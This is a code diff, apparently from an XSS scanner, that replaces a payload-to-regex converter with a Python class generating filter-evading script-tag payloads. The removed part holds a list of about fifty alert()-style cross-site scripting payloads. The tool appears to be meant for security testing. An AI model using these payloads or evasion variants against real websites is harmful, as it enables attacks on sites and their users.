@@ -1,79 +1,35 @@
-import re
+from lib.helper.helper import *
+from random import randint
+from bs4 import BeautifulSoup
+from urllib.parse import urljoin, urlparse, parse_qs, urlencode
+from lib.helper.Log import *
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+import os
 
-# Fungsi untuk mengubah payload menjadi regex
-def convert_to_regex(payload):
-    # Escape semua karakter khusus untuk memastikan payload diperlakukan sebagai string literal dalam regex
-    escaped_payload = re.escape(payload)
-    # Ganti spasi dengan \s+ untuk memungkinkan jumlah spasi yang bervariasi
-    regex_payload = re.sub(r'\\s+', r'\\s+', escaped_payload)
-    return regex_payload
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 
-# Baca payload dari file
-with open('payloads.txt', 'r') as file:
-    payloads = file.readlines()
+class core:
+    
+    @classmethod
+    def load_payloads(cls, filename):
+        filepath = os.path.join(os.path.dirname(__file__), filename)
+        with open(filepath, 'r') as file:
+            return [line.strip() for line in file.readlines()]
+    
+    @classmethod
+    def generate(cls, eff):
+        FUNCTION = cls.load_payloads('payload1.txt')  # Menggunakan payload1.txt
+        if eff == 1:
+            return "<script/>" + FUNCTION[randint(0, len(FUNCTION) - 1)] + "<\script\>"
+        elif eff == 2:
+            return "<\script/>" + FUNCTION[randint(0, len(FUNCTION) - 1)] + "<\\script>"
+        elif eff == 3:
+            return "<\script\> " + FUNCTION[randint(0, len(FUNCTION) - 1)] + "<//script>"
+        elif eff == 4:
+            return "<script>" + FUNCTION[randint(0, len(FUNCTION) - 1)] + "<\script/>"
+        elif eff == 5:
+            return "<script>" + FUNCTION[randint(0, len(FUNCTION) - 1)] + "<//script>"
+        elif eff == 6:
+            return "<script>" + FUNCTION[randint(0, len(FUNCTION) - 1)] + "</script>"
 
-# Ubah setiap payload menjadi regex
-regex_payloads = [convert_to_regex(payload.strip()) for payload in payloads]
-
-# Simpan regex ke dalam file baru
-with open('regex_payloads.txt', 'w') as file:
-    for regex_payload in regex_payloads:
-        file.write(regex_payload + '\n')
-
-# Cetak regex payload yang dihasilkan
-for regex_payload in regex_payloads:
-    print(regex_payload)
-
-
-
-
-
-<script>alert("XSS");</script>
-<img src="x" onerror="alert('XSS')">
-<svg onload="alert('XSS')">
-<body onload="alert('XSS')">
-<iframe src="javascript:alert('XSS')"></iframe>
-<input type="text" value="<script>alert('XSS');</script>">
-<div onmouseover="alert('XSS')">hover me</div>
-<a href="javascript:alert('XSS')">click me</a>
-<form action="javascript:alert('XSS')"><input type="submit"></form>
-<marquee onstart="alert('XSS')">marquee text</marquee>
-<object data="javascript:alert('XSS')"></object>
-<embed src="javascript:alert('XSS')"></embed>
-<bgsound src="javascript:alert('XSS')">
-<isindex action="javascript:alert('XSS')">
-<base href="javascript:alert('XSS')//">
-<link rel="stylesheet" href="javascript:alert('XSS')">
-<table background="javascript:alert('XSS')">
-<td background="javascript:alert('XSS')">
-<div style="background-image: url(javascript:alert('XSS'))">div text</div>
-<img dynsrc="javascript:alert('XSS')">
-<img lowsrc="javascript:alert('XSS')">
-<br size="&{alert('XSS')}">
-<layer src="javascript:alert('XSS')"></layer>
-<xml id="xss"><a><b><img src="javascript:alert('XSS')"></b></a></xml>
-<style>@import "javascript:alert('XSS')";</style>
-<meta http-equiv="refresh" content="0;url=javascript:alert('XSS');">
-<base href="javascript:alert('XSS')"><a href="/">test</a>
-<div style="width: expression(alert('XSS'));">test</div>
-<img src=`javascript:alert('XSS')`>
-<embed src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+PC9zdmc+"></embed>
-<script src="data:text/javascript;base64,YWxlcnQoMSk+PC9zY3JpcHQ+"></script>
-<iframe srcdoc="&lt;script&gt;alert('XSS')&lt;/script&gt;"></iframe>
-<object type="text/x-scriptlet" data="http://jsfiddle.net/XLE63/ "></object>
-<form><button formaction="javascript:alert('XSS')">X</button></form>
-<math><a xlink:href="javascript:alert('XSS')">click</a></math>
-<svg><desc><![CDATA[><script>alert('XSS')</script>]]></desc></svg>
-<audio src="x" onerror="alert('XSS')">
-<video src="x" onerror="alert('XSS')">
-<img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+PC9zdmc+">
-<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAUA"></img>
-<img src="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"></img>
-<img src="data:text/html,<script>alert('XSS')</script>">
-<input type="text" value="<img src=x onerror=alert('XSS')>">
-<div onmouseover="javascript:alert('XSS')">hover me</div>
-<button onclick="alert('XSS')">click me</button>
-<meta charset="utf-8"><body onload=alert('XSS')></body>
-<img src="http://evil.com/xss.jpg">
-<img src="javascript:alert('XSS')">
-<img src="vbscript:msgbox('XSS')">
+    # Metode lain tetap sama...
